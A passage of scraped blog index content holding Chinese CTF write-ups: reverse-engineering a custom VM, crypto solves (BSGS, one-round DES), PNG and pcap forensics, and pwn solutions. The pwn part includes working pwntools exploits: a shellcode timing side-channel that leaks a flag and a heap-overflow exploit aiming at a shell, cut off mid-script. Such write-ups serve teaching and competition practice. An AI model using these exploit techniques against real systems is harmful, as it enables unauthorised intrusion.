20, 9, 23, 0, 36, 5, 3, 17, 29, 6, 0, 0, 5, 3, 17, 64, 6, 0, 72, 5, 17, 29, 23, 14, 1, 21, 4, 15, 1, 22, 2, 0, 0, 4, 3, 5, 16, 20, 50, 5, 9, 2, 19, 29, 5, 18, 21, 4, 16, 20, 61, 10, 1, 19, 52, 3, 4, 18, 14, 1, 21, 4, 7, 1, 22, 2, 0, 0, 4, 3, 5, 16, 20, 85, 5, 9, 1, 19, 64, 5, 18 ] sub_400E1D = \u0026#34;push({});\u0026#34; sub_400E78 = \u0026#34;pop({});\u0026#34; sub_400F16 = \u0026#34;{}+= {};\u0026#34; sub_400FA8 = \u0026#34;{}-= {};\u0026#34; eip = 0 # 20 eax = 0 # 16 ebx = 0 # 17 ecx = 0 # 18 edx = 0 # 19 memory = [2] * 0x1000 memory2 = [1] * 50 while eip \u0026lt; len(code): cur_op = code[eip] if cur_op == 0: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = cur_arg eip += 1 elif cur_op == 1: cur_arg = \u0026#34;eax\u0026#34; print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = eax elif cur_op == 2: cur_arg = \u0026#34;ebx\u0026#34; print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = ebx elif cur_op == 3: cur_arg = \u0026#34;ecx\u0026#34; print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = ecx elif cur_op == 4: cur_arg = \u0026#34;eax\u0026#34; edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, sub_400E78.format(cur_arg)) eax = memory[edx] elif cur_op == 5: cur_arg = \u0026#34;ebx\u0026#34; edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, sub_400E78.format(cur_arg)) ebx = memory[edx] elif cur_op == 6: cur_arg = \u0026#34;ecx\u0026#34; edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, sub_400E78.format(cur_arg)) ecx = memory[edx] elif cur_op == 7: eax += ebx print (\u0026#34;_%02X:\u0026#34; % eip, \u0026#34;eax += ebx;\u0026#34;) elif cur_op == 8: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400F16.format(\u0026#34;eax\u0026#34;, cur_arg)) eax += cur_arg eip += 1 elif cur_op == 9: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400F16.format(\u0026#34;ebx\u0026#34;, cur_arg)) ebx += cur_arg eip += 1 elif cur_op == 10: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400F16.format(\u0026#34;ecx\u0026#34;, cur_arg)) ecx += cur_arg eip += 1 elif cur_op == 11: eax -= ebx print (\u0026#34;_%02X:\u0026#34; % eip, \u0026#34;eax -= ebx;\u0026#34;) elif cur_op == 12: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400FA8.format(\u0026#34;eax\u0026#34;, cur_arg)) eax -= cur_arg eip += 1 elif cur_op == 13: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400FA8.format(\u0026#34;ebx\u0026#34;, cur_arg)) ebx -= cur_arg eip += 1 elif cur_op == 14: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400FA8.format(\u0026#34;ecx\u0026#34;, cur_arg)) eip += 1 elif cur_op == 15: eax ^= ebx print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;eax ^= ebx;\u0026#34;) elif cur_op == 16: zf = (eax == ebx) print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;zf = (eax == ebx);\u0026#34;) elif cur_op == 17: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;push(eip+2); eip = {hex(cur_arg)};\u0026#34;) memory[edx] = eip edx += 1 eip += 1 elif cur_op == 18: edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;pop(eip);\u0026#34;) elif cur_op == 19: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;eip = {hex(cur_arg)};\u0026#34;) eip += 1 elif cur_op == 20: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;if zf: eip = {hex(cur_arg)};\u0026#34;) eip += 1 elif cur_op == 21: memory[edx] = memory2[ecx] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;push(memory2[ecx]);\u0026#34;) edx += 1 elif cur_op == 22: edx -= 1 memory2[ecx] = memory[edx] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;pop(memory2[ecx]);\u0026#34;) elif cur_op == 23: print (\u0026#34;_%02X:\u0026#34; % eip, \u0026#34;break;\u0026#34;) eip += 1 拿到反汇编结果\n_00: push(eip+2); eip = 0x34;\r_02: push(42);\r_04: pop(ebx);\r_05: zf = (eax == ebx);\r_06: if zf: eip = 0x9;\r_08: break;\r_09: push(36);\r_0B: pop(ebx);\r_0C: push(ecx);\r_0D: push(eip+2); eip = 0x1d;\r_0F: pop(ecx);\r_10: push(0);\r_12: pop(ebx);\r_13: push(ecx);\r_14: push(eip+2); eip = 0x40;\r_16: pop(ecx);\r_17: push(72);\r_19: pop(ebx);\r_1A: push(eip+2); eip = 0x1d;\r_1C: break;\r_1D: ecx -= 1;\r_1F: push(memory2[ecx]);\r_20: pop(eax);\r_21: eax ^= ebx;\r_22: push(eax);\r_23: pop(memory2[ecx]);\r_24: push(ebx);\r_25: push(0);\r_27: pop(eax);\r_28: push(ecx);\r_29: pop(ebx);\r_2A: zf = (eax == ebx);\r_2B: if zf: eip = 0x32;\r_2D: pop(ebx);\r_2E: ebx += 2;\r_30: eip = 0x1d;\r_32: pop(ebx);\r_33: pop(eip);\r_34: push(memory2[ecx]);\r_35: pop(eax);\r_36: zf = (eax == ebx);\r_37: if zf: eip = 0x3d;\r_39: ecx += 1;\r_3B: eip = 0x34;\r_3D: push(ecx);\r_3E: pop(eax);\r_3F: pop(eip);\r_40: ecx -= 1;\r_42: push(memory2[ecx]);\r_43: pop(eax);\r_44: eax += ebx;\r_45: push(eax);\r_46: pop(memory2[ecx]);\r_47: push(ebx);\r_48: push(0);\r_4A: pop(eax);\r_4B: push(ecx);\r_4C: pop(ebx);\r_4D: zf = (eax == ebx);\r_4E: if zf: eip = 0x55;\r_50: pop(ebx);\r_51: ebx += 1;\r_53: eip = 0x40;\r_55: pop(ebx);\r_56: pop(eip);\r发现其实是调用了几个函数，分别在0x34、0x40、0x1D\n0x34处的函数判断了长度，0x1D处的函数从后往前异或数字，每次加2，0x40处的函数从后往前进行加法，数字每次加1\n所以最后的加密算法为：首先从后往前 ^36, ^38, ^40，随后从后往前+0, +1, +2\u0026hellip;，最后从后往前 ^72, ^74, ^76\u0026hellip;\n反向解密即可\ns2 = [ 0xA3, 0xD8, 0xAC, 0xA9, 0xA8, 0xD6, 0xA6, 0xCD, 0xD0, 0xD5, 0xF7, 0xB7, 0x9C, 0xB3, 0x31, 0x2D, 0x40, 0x5B, 0x4B, 0x3A, 0xFD, 0x57, 0x42, 0x5F, 0x58, 0x52, 0x54, 0x1B, 0x0C, 0x78, 0x39, 0x2D, 0xD9, 0x3D, 0x35, 0x1F, 0x09, 0x41, 0x40, 0x47, 0x42, 0x11 ] flag = \u0026#39;\u0026#39; x = 36 y = 0 z = 72 for i in s2[::-1]: flag += chr(((i ^ z) - y) ^ x) x += 2 y += 1 z += 2 print (flag[::-1]) # \u0026#39;flag{Now_Y0u_Know_th4_Signa1_0f_Linux!!!!}\u0026#39; Crypto [萌新]素数 使用gmpy2生成10个大素数，然后依次提交即可\n[签到]键盘侠 根据题目名称，猜测和键盘有关系\n将密文放入键盘的对应位置后，发现一组密文在键盘上构成一个图案，这个图案是一个字母\n比如UYTGBNM在键盘上组成一个C，同样的方式和可以还原出其他字母\nsilent_peeper 离散对数，考虑幂只有40bit，用BSGS即可解出答案。\nsage: p = 17480715736546509273132356167852223654917350291331787539356496312333028105252468745075491024000992015452563532 ....: 520952698743383378549938420481917954954410649849158983419586000890687503941868419125253760412312965974672161440234 ....: 6449135195832955793815709136053198207712511838753919608894095907732099313139446299843 ....: g = 41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307 ....: 185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366 ....: 973332463469104730271236078593527144954324116802080620822212777139186990364810367977 ....: sage: bsgs(mod(g,p),mod(A,p),(0,1\u0026lt;\u0026lt;40)) 822690494337 sage: bsgs(mod(g,p),mod(B,p),(0,1\u0026lt;\u0026lt;40)) 621209248538 sage: key = pow(A, 621209248538 ,p) sage: key 49490143664250726340234715933627573928019204778410313862054713655398194526581099674219755475997125892095025977920719640048704962181220475413665581922989858463397985369540020911109237604500080688916224884254427061443849735076051958183562833019840975221087968773423237208708556105725003184929141476854095400756 \u0026gt;\u0026gt;\u0026gt; from Crypto.Util.number import * \u0026gt;\u0026gt;\u0026gt; from Crypto.Cipher import AES \u0026gt;\u0026gt;\u0026gt; ciphertext = 0xed5c68ebb65aa3a13afb259cf3984ce60bdc54b7ef918b850745df850cf4c450b02216c0c6e67ed501a17e516496cd6c \u0026gt;\u0026gt;\u0026gt; key = 49490143664250726340234715933627573928019204778410313862054713655398194526581099674219755475997125892095025977920719640048704962181220475413665581922989858463397985369540020911109237604500080688916224884254427061443849735076051958183562833019840975221087968773423237208708556105725003184929141476854095400756 \u0026gt;\u0026gt;\u0026gt; key = long_to_bytes(key)[:16] \u0026gt;\u0026gt;\u0026gt; cipher = AES.new(key, AES.MODE_ECB) \u0026gt;\u0026gt;\u0026gt; cipher.decrypt(int.to_bytes(ciphertext, ciphertext.bit_length()//8, \u0026#39;big\u0026#39;)) b\u0026#39;flag{21384433-0dc7-413b-9d09-64cc97c99730}\\x06\\x06\\x06\\x06\\x06\\x06\u0026#39; EzDES 题目是个DES一轮差分，有数学公式: $ L_1=R_0,R_1=L_0\\oplus f(R_0,K_0) $，其中L1R1,L0R0都是已知量，只需要逆推到s盒附近，通过s盒的结果爆破s盒的输入即可，有65536种可能，然后用剩下几个明密文对验证，排除出剩一种结果。主要代码如下(请将S盒，IP盒等内容分别命名为IP_1.txt，sbox.txt等放入文件src子目录下，详情见代码)\n######################################################################### # Get roundKey ######################################################################### # get the move number def getMoveNum(): res = [0] * 16 for i in range(16): if i == 0 or i == 1 or i == 8 or i == 15: res[i] = 1 else: res[i] = 2 return res # get the PC_1 table and PC_2 table def getPC(): PC_1_str = open(\u0026#39;./src/PC_1.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() PC_2_str = open(\u0026#39;./src/PC_2.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() PC_1 = [0] * len(PC_1_str) PC_2 = [0] * len(PC_2_str) for i in range(len(PC_1_str)): PC_1[i] = int(PC_1_str[i]) for i in range(len(PC_2_str)): PC_2[i] = int(PC_2_str[i]) return PC_1, PC_2 # cyclic shift to the left def leftRow(arr, n): temp = [0] * n length = len(arr) for i in range(n): temp[i] = arr[i] for i in range(length): if i \u0026lt; length - n: arr[i] = arr[i + n] else: arr[i] = temp[i - length + n] return arr # get the k0 - k16 def genKey(key): C = [0] * 28 D = [0] * 28 K = [0] * 56 roundKey = [[0]*48 for i in range(16)] PC_1, PC_2 = getPC() moveNum = getMoveNum() # get K+ for i in range(56): K[i] = key[PC_1[i] - 1] # get C0 and D0 for i in range(28): C[i] = K[i] D[i] = K[i + 28] # get roundKey for i in range(16): C = leftRow(C, moveNum[i]) D = leftRow(D, moveNum[i]) for j in range(48): if PC_2[j] \u0026lt;= 28: roundKey[i][j] = C[PC_2[j] - 1] else: roundKey[i][j] = D[PC_2[j] - 28 -1] return roundKey ######################################################################### # Encrypt and Decrypt ######################################################################### #get the IP and PC_1 table def getIP(): IP_str = open(\u0026#39;./src/IP.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() IP_1_str = open(\u0026#39;./src/IP_1.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() IP = [0] * len(IP_str) IP_1 = [0] * len(IP_1_str) for i in range(len(IP_str)): IP[i] = int(IP_str[i]) for i in range(len(IP_1_str)): IP_1[i] = int(IP_1_str[i]) return IP, IP_1 # l1 xor l2 def xor(l1, l2): res = [0] * len(l1) for i in range(len(l1)): res[i] = l1[i] ^ l2[i] return res # get the Extend table def getE(): E_str = open(\u0026#39;./src/extend.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() E = [0] * len(E_str) for i in range(len(E_str)): E[i] = int(E_str[i]) return E # extend R from 32 bit to 48 bit def extend(R): res = [0] * 48 E = getE() for i in range(48): res[i] = R[E[i] - 1] return res # get sbox in 3 dim def getSbox(): S_str = open(\u0026#39;./src/sbox.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() S = [[[0]*16 for i in range(4)]for i in range(8)] l = 0 for i in range(8): for j in range(4): for k in range(16): S[i][j][k] = int(S_str[l]) l += 1 return S # number in dec to number in bit def d2b(n): res = \u0026#39;\u0026#39; while n \u0026gt; 0: res += chr(n % 2 + ord(\u0026#39;0\u0026#39;)) n = n // 2 while len(res) \u0026lt; 4: res += \u0026#39;0\u0026#39; return res[::-1] # sbox replacement def sbox(ipt): S = getSbox() res = [0] * 32 i, l = 0, 0 while i \u0026lt; 48: j = ipt[i] * 2 + ipt[i + 5] k = ipt[i + 1] * 8 + ipt[i + 2] * 4 + ipt[i + 3] * 2 + ipt[i + 4] temp = d2b(S[l][j][k]) for m in range(4): res[m + l * 4] = int(temp[m]) l += 1 i += 6 return res # get Pbox def getPbox(): P_str = open(\u0026#39;./src/pbox.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() P = [0] * len(P_str) for i in range(len(P_str)): P[i] = int(P_str[i]) return P # pbox replacement def pbox(ipt): P = getPbox() res = [0] * 32 for i in range(32): res[i] = ipt[P[i] - 1] return res # f function def f(R, K): # extend R E_R = extend(R) # E_R xor K afterADD = xor(E_R, K) # sbox afterSbox = sbox(afterADD) # linear displacement res = pbox(afterSbox) return res # Encrypt function def DES_Encrypt(plaintext, roundkey): M_IP = [0] * 64 cipher = [0] * 64 afterF = [0] * 64 L = [[0] * 32 for i in range(17)] R = [[0] * 32 for i in range(17)] IP, IP_1 = getIP() # get IP replace for i in range(64): M_IP[i] = plaintext[IP[i] - 1] # get L0 and R0 for i in range(32): L[0][i] = M_IP[i] R[0][i] = M_IP[i + 32] for i in range(1,17): # L[i] = R[i - 1] for j in range(32): L[i][j] = R[i - 1][j] R[i] = xor(L[i - 1], f(R[i - 1], roundkey[i - 1])) # merge the R and L for i in range(64): if i \u0026lt; 32: afterF[i] = R[16][i] else: afterF[i] = L[16][i - 32] # using IP_1 replace to get cipher for i in range(64): cipher[i] = afterF[IP_1[i] - 1] return cipher ######################################################################### # Main ######################################################################### # number in hex to number in bin def hex_to_bin(a): b = int(a, 16) res = \u0026#39;\u0026#39; while b \u0026gt; 0: res += chr(b % 2 + ord(\u0026#39;0\u0026#39;)) b = b // 2 while len(res) \u0026lt; 4: res += \u0026#39;0\u0026#39; return res[::-1] # text in hex to text in bin def h2b(s): res = [] for i in s: temp = hex_to_bin(i) for j in range(4): res.append(int(temp[j])) return res # number in bin to number in hex def bin_to_hex(a): b = int(a, 2) return hex(b)[2:] # text in bin to text in hex def b2h(s): res = \u0026#39;\u0026#39; now_bin = \u0026#39;\u0026#39; for i in range(len(s)): now_bin += chr(s[i] + ord(\u0026#39;0\u0026#39;)) if len(now_bin) % 4 == 0: res += bin_to_hex(now_bin) now_bin = \u0026#39;\u0026#39; return res def gen_P_1(): p = getPbox() p_1 = [0] * 32; for i in range(32): p_1[p[i] - 1] = i return p_1 def str2martix(s): m = [0] * 6 for i in range(6): m[i] = int(s[i], 2) return m def solve(plaintext, cipher): m = h2b(plaintext) c = h2b(cipher) C_IP = [0] * 64 M_IP = [0] * 64 cipher = [0] * 64 may_after_xor = [[\u0026#39;\u0026#39;for i in range(4)]for j in range(8)] L = [[0] * 32 for i in range(17)] R = [[0] * 32 for i in range(17)] ast = [0] * 32 IP, IP_1 = getIP() before_p = [0] * 32 S = getSbox() p_1 = gen_P_1() # get IP replace for i in range(64): M_IP[i] = m[IP[i] - 1] C_IP[i] = c[IP[i] - 1] # get L0 and R0 for i in range(32): L[0][i] = M_IP[i] R[0][i] = M_IP[i + 32] for i in range(32): L[1][i] = C_IP[i] R[1][i] = C_IP[i + 32] e = extend(R[0]) cip = xor(R[1], L[0]) for i in range(32): before_p[i] = cip[p_1[i]] # 还原进入sbox前的值 for i in range(8): for j in range(4): for k in range(16): if S[i][j][k] == int(b2h(before_p[i*4:(i+1)*4]), 16): may_after_xor[i][j] = (bin(j)[2:].zfill(2)[0] + bin(k)[2:].zfill(4) + bin(j)[2:].zfill(2)[1]) may_res = [[[]for i in range(4)]for j in range(8)] for i in range(8): for j in range(4): may_after_xor[i][j] = str2martix(may_after_xor[i][j]) # 还原所有可能的K for i in range(8): for j in range(4): may_res[i][j] = (xor(may_after_xor[i][j], e[i*6:(i+1)*6])) return may_res def gen_PC_1(): PC_1, PC_2 = getPC() PC1, PC2 = [-1] * 64, [-1] * 56 for i in range(56): PC1[PC_1[i] - 1] = i for i in range(48): PC2[PC_2[i] - 1] = i return PC1, PC2 # def resolve_key(roundKey): # C = [0] * 28 # D = [0] * 28 # K = [0] * 56 # PC_1, PC_2 = getPC() # PC1, PC2 = gen_PC_1() # moveNum = getMoveNum() # for i in range(48): # if PC2[j] \u0026lt;= 28: # C[PC2[j]] = roundKey[i] # else: # D[PC2[j] - 28] = roundKey[i] # C = leftRow(C, 28 - moveNum[i]) # D = leftRow(D, 28 - moveNum[i]) # for i in range(28): # K[i] = C[i] # K[i + 28] = D[i] # for i in range(56): # key[PC1[i]] = K[i] # return key if __name__ == \u0026#39;__main__\u0026#39;: plaintext1 = \u0026#34;4845AB454511C0F0\u0026#34; miwen1 = \u0026#34;2EA85F08AA80C2D2\u0026#34; plaintext2 = \u0026#34;0123456789ABCDEF\u0026#34; miwen2 = \u0026#34;0293A8B9E45FCE5D\u0026#34; plaintext3 = \u0026#34;81120015A001FDF1\u0026#34; miwen3 = \u0026#34;E88382207800FE7A\u0026#34; plaintext4 = \u0026#34;2214500AEF00CD48\u0026#34; miwen4=\u0026#34;B38AA0AD7720E4AC\u0026#34; plaintext5 = \u0026#34;5791AC22121B1234\u0026#34; miwen5=\u0026#34;A3C0DEB9AB0F833A\u0026#34; K1 = solve(plaintext1, miwen1) K2 = solve(plaintext2, miwen2) K3 = solve(plaintext3, miwen3) K4 = solve(plaintext4, miwen4) K5 = solve(plaintext5, miwen5) K = [] for i in range(8): for j in range(4): if (K1[i][j] in K2[i]) and (K1[i][j] in K3[i]) and (K1[i][j] in K4[i]) and (K1[i][j] in K5[i]): print(i, j) K += K1[i][j] print(K) Misc [萌新]在哪儿呢 PDF里面有很多不可见字符，直接复制粘贴到sublime里面就可以看到flag\nflag{hey_there_is_no_thing}\n[签到]签到 题目描述，直接提交\n只是个PNG，别想太多了.png 拿到png，利用pngdebugger查，发现后面的块恢复成IDAT就行\n\r\ncrc不对，爆破长宽，抄了个大师傅的脚本\nimport zlib import struct file = \u0026#39;PNG.png\u0026#39; fr = open(file,\u0026#39;rb\u0026#39;).read() data = bytearray(fr[12:29]) crc32key = eval(str(fr[29:33]).replace(\u0026#39;\\\\x\u0026#39;,\u0026#39;\u0026#39;).replace(\u0026#34;b\u0026#39;\u0026#34;,\u0026#39;0x\u0026#39;).replace(\u0026#34;\u0026#39;\u0026#34;,\u0026#39;\u0026#39;)) #crc32key = 0xCBD6DF8A  #data = bytearray(b\u0026#39;\\x49\\x48\\x44\\x52\\x00\\x00\\x01\\xF4\\x00\\x00\\x01\\xF1\\x08\\x06\\x00\\x00\\x00\u0026#39;)  n = 4095 for w in range(n): width = bytearray(struct.pack(\u0026#39;\u0026gt;i\u0026#39;, w)) for h in range(n): height = bytearray(struct.pack(\u0026#39;\u0026gt;i\u0026#39;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] #print(data) crc32result = zlib.crc32(data) if crc32result == crc32key: print(width,height) newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(file+\u0026#39;.png\u0026#39;,\u0026#39;wb\u0026#39;) fw.write(newpic) fw.close # return None 恢复后图片新增内容\n\r\n看到多了一个压缩的部分，拿binwalk分了下，flag在后面的文件中\nflag{zhe_ti_mu_ye_tai_bt_le_XD}\n压缩包压缩包压缩包压缩包 import zipfile import os for i in range(0,1000): name = os.listdir(\u0026#34;./\u0026#34;)[0] zfile = zipfile.ZipFile(name,\u0026#39;r\u0026#39;) in_file = zfile.namelist()[0] passwd = in_file[0:-4] zfile.extract(in_file, \u0026#39;./\u0026#39;,bytes(passwd,encoding =\u0026#34;ascii\u0026#34;)) zfile.close() os.remove(name) 解出23333.zip\n密码根据规律猜测是3-6位，爆破得到756698是密码\n010editor搜索flag得到flag\nflag{Unz1p_i5_So_C00l##}\nrange_download 过滤dns报文，存在几条query name为xx.nss.neusoft.edu.cn的dns请求包，应该是base64编码的dns隧道，上脚本分析：\nimport pyshark import re import base64 cap = pyshark.FileCapture(\u0026#39;range.pcapng\u0026#39;,display_filter=\u0026#39;dns and dns.flags==0x00000100 and dns.qry.name matches \u0026#34;^[^.-]*\\.nss.neusoft.edu.cn$\u0026#34;\u0026#39;) datas = [] ids = [] for pkt in cap: name = pkt.dns.qry_name id = pkt.dns.id match = re.search(\u0026#39;^([^.-]*)\\.nss.neusoft.edu.cn$\u0026#39;, name) data = \u0026#39;\u0026#39; if match: data = match.group(1) if data == \u0026#39;\u0026#39;: print(\u0026#39;error! \u0026#39; + name) if id in ids: continue datas.append(data) ids.append(id) line = \u0026#39;\u0026#39;.join(datas) img = base64.b64decode(line.encode()) print(img) cap.close() 跑出来是password: nss_yyds!\n过滤http协议，全都是206 Partial Content，把flag.7z一个字节一个字节地传了过来，顺序是乱的，需要写脚本恢复。调试的时候发现基本每个字节都会被传输很多次，并且有一个字节没有被传输，这些在写脚本的时候都需要注意到。\nimport pyshark import re import base64 cap = pyshark.FileCapture(\u0026#39;range.pcapng\u0026#39;,display_filter=\u0026#39;http and http.response.code == 206\u0026#39;) data = bytearray(2460) poslist = [False for i in range(2460)] for pkt in cap: length = int(pkt.http.content_length) payload = pkt.http.file_data.binary_value for field in pkt.http.response_line.alternate_fields: if field.showname_key == \u0026#39;Content-Range\u0026#39;: pos_start = -1 pos_end = -1 contentRange = field.showname_value.strip(\u0026#39;\\\\r\\\\n\u0026#39;) match = re.search(\u0026#39;bytes (\\d+)-(\\d+)/\\d+\u0026#39;, contentRange) if match: pos_start = int(match.group(1)) pos_end = int(match.group(2)) assert(pos_end - pos_start + 1 == length) for i in range(pos_start, pos_end+1): if poslist[i] == True: assert(data[i] == payload[i-pos_start]) else: poslist[i] = True data[pos_start:pos_end+1] = payload else: print(\u0026#39;Error! Range not found!\u0026#39;) exit(0) break else: pass for i in range(2460): if poslist[i] == False: print(i) cap.close() with open(\u0026#39;flag.7z\u0026#39;,\u0026#39;wb\u0026#39;) as f: f.write(data) 下标2349位置的字节未知，需要爆破一下：\nimport py7zr import os import _lzma with open(\u0026#39;flag.7z\u0026#39;,\u0026#39;rb\u0026#39;) as f: source = f.read() data = bytearray(source) for i in range(256): print(\u0026#34;Now: \u0026#34;+str(i)) data[2349] = i with open(\u0026#39;flag%d.7z\u0026#39;%(i),\u0026#39;wb\u0026#39;) as f1: f1.write(data) try: with py7zr.SevenZipFile(\u0026#39;flag%d.7z\u0026#39;%(i), \u0026#39;r\u0026#39;, password=\u0026#39;nss_yyds!\u0026#39;) as archive: if archive.test() == True or archive.test() == None: print(\u0026#39;Found:\u0026#39; + str(i)) break else: os.remove(\u0026#39;flag%d.7z\u0026#39;%(i)) except (py7zr.exceptions.Bad7zFile, _lzma.LZMAError) as e: print(e) os.remove(\u0026#39;flag%d.7z\u0026#39;%(i)) 运行结果是194，将flag194.7z解压得到flag.png\n\r\n解码为5133687161454e534e6b394d4d325a7854475233566e6870626a42554e6a5a4a5645466c4e47786a62324e464d47705557464635546d6c536148565165564659645563774e327073515863324f5846555247314555564134555570706344686957444d336544684c596c4255556e6333636e687165486c756446413351577470566e4242526b6c4a5457316c515452754d555661636e4a7859556430566c4d3559557844656a4a35626c68334d6d5a4c51513d3d\nciphey一把梭：\n\r\nflag{6095B134-5437-4B21-BE52-EDC46A276297}\n","date":"2021-12-06T19:23:41+08:00","image":"https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/Top%2010%20Teams_hu9bd851d71a6520395d404c81ac536fbe_87588_120x120_fill_box_smart1_3.png","permalink":"https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/","title":"2021暗泉杯 Writeup"},{"content":"Misc 溯源取证——张三的电脑 下载得到压缩包，经过判断类型后得知是 VMDK 文件，用 vmware 挂载。其中得到了 zhangsan.001 和 zhangsan.ad1.txt 两个文件\nwinhex挂载 zhangsan.001，在分区1的 $RECYCLE.BIN 中找到 tips.txt.txt 文件，内容为\nIn order to prevent leaving evidence, Zhang San deleted all the key evidence photos.\r因此寻找 png 文件，同样在分区1的 $RECYCLE.BIN 中找到了包含相应的 flag 图片 $REFK9A1.png\nPwn secretcode 掏出初赛的代码稍微改改\nfrom pwn import * import sys # context.log_level = \u0026#34;debug\u0026#34; context.arch = \u0026#39;amd64\u0026#39; if len(sys.argv) \u0026lt; 2: debug = True else: debug = False ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a, b) def debugf(b=0): if debug: if b: gdb.attach(p,\u0026#34;b *$rebase({b})\u0026#34;.format(b = hex(b))) else: gdb.attach(p) def pwn(p, index, ch): # open shellcode = \u0026#34;push 0x1003caaa; pop rdi; shr edi, 12; xor esi, esi; push 2; pop rax; syscall;\u0026#34; # re open, rax =\u0026gt; 4 shellcode += \u0026#34;and ecx,0x15;inc ecx;\u0026#34; shellcode += \u0026#34;s:push 2; pop rax; push rcx;syscall; pop rcx;loop s;\u0026#34; # read(rax, 0x10040, 0x50) shellcode += \u0026#34;mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;\u0026#34; # cmp and jz if index == 0: shellcode += \u0026#34;cmp byte ptr[rsi+{0}], {1}; jz $-3; ret\u0026#34;.format(index, ch) else: shellcode += \u0026#34;cmp byte ptr[rsi+{0}], {1}; jz $-4; ret\u0026#34;.format(index, ch) shellcode = asm(shellcode) pay = shellcode.ljust(0x40 - 4, b\u0026#39;a\u0026#39;) + b\u0026#39;flag\u0026#39; log.warning(hex(len(pay))) p.sendafter(\u0026#34;==\\n\u0026#34;, pay) index = 0 ans = [] while True: for ch in range(0x20, 127): try: if debug: p = process(\u0026#34;./chall\u0026#34;) else: p = remote(\u0026#39;47.104.169.149\u0026#39;, 25178) pwn(p, index, ch) start = time.time() p.recv(timeout=2) except: pass end = time.time() p.close() if end - start \u0026gt; 1.5: ans.append(ch) print(\u0026#34;\u0026#34;.join([chr(i) for i in ans])) break else: print(\u0026#34;\u0026#34;.join([chr(i) for i in ans])) break index = index + 1 print(ans) print(\u0026#34;\u0026#34;.join([chr(i) for i in ans])) p.interactive() babynote abs32的洞，直接上下无限堆溢出\nfrom pwn import * import sys context.log_level = \u0026#34;debug\u0026#34; if len(sys.argv) \u0026lt; 2: debug = True else: debug = False if debug: p = process(\u0026#34;./chall\u0026#34;) libc = ELF(\u0026#34;/home/daidaishou/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc.so.6\u0026#34;) else: p = remote(\u0026#34;47.104.169.149\u0026#34;,\u0026#34;14269\u0026#34;) libc = ELF(\u0026#34;./libc-2.27.so\u0026#34;) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a, b) def debugf(b=0): if debug: if b: gdb.attach(p,\u0026#34;b *$rebase({b})\u0026#34;.format(b = hex(b))) else: gdb.attach(p) def menu(i): sla(\u0026#39;\u0026gt; \u0026#39;, str(i)) def add(sz, c): menu(1) sla(\u0026#39;size\u0026gt; \u0026#39;, str(sz)) sa(\u0026#39;msg\u0026gt; \u0026#39;, c) def free(i): menu(3) sla(\u0026#39;idx\u0026gt; \u0026#39;, str(i)) def edit(i, offset, c): menu(2) sla(\u0026#39;idx\u0026gt; \u0026#39;, str(i)) sla(\u0026#39;offset\u0026gt; \u0026#39;, str(offset)) sa(\u0026#39;msg\u0026gt; \u0026#39;, c) def show(i): menu(4) sla(\u0026#39;idx\u0026gt; \u0026#39;, str(i)) debugf() add(0x29c, b\u0026#39;Chunk_0\\n\u0026#39;) add(0x200, b\u0026#39;Chunk_1\\n\u0026#39;) add(0x78, b\u0026#39;Chunk_2\\n\u0026#39;) add(0x21f, b\u0026#39;Chunk_3\\n\u0026#39;) add(0x18, b\u0026#39;/bin/sh\\n\u0026#39;) edit(0, 0x80000000, b\u0026#39;\\x07\u0026#39;*0x5e + b\u0026#39;\\n\u0026#39;) free(1) edit(3, 0x80000000, b\u0026#39;a\u0026#39;*0x52 + p64(0x80+0x210) + p64(0x230) + b\u0026#39;\\n\u0026#39;) free(3) add(0x200, 